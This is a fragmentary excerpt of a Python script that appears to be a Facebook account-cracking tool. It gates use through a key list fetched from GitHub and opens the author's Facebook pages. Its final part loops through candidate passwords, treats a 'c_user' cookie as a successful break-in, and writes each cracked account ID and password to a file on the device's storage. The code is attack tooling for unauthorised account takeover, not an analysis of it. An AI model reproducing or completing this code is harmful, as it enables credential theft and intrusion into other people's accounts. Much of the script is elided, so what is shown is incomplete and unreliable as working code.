...
def menu_apikey():
  ...
  id = "@".join(uuid)
  server = requests.get('https://github.com/K1245780/Kallan_mitro8/blob/main/Afroveal5.txt').text
...
╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝
  ...
  try:
    httpCaht = requests.get("https://github.com/K1245780/Kallan_mitro8/blob/main/Afroveal5.txt").text
    if id in httpCaht:
      ...
      os.system('xdg-open https://www.facebook.com/lh.emran?text='+id)
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
...
def admin():
	...
	if bal =='1':
		os.system('xdg-open https://www.facebook.com/lh.emran');time.sleep(1)
		admin()
	if bal =='2':
		os.system('xdg-open https://www.facebook.com/lh.emran');time.sleep(1)
		admin()
	if bal =='3':
		os.system('xdg-open https://facebook.com/groups/611206677798030/');time.sleep(1)
		admin()
	if bal =='0':
		Main()
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/kallan.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(uid)
                break
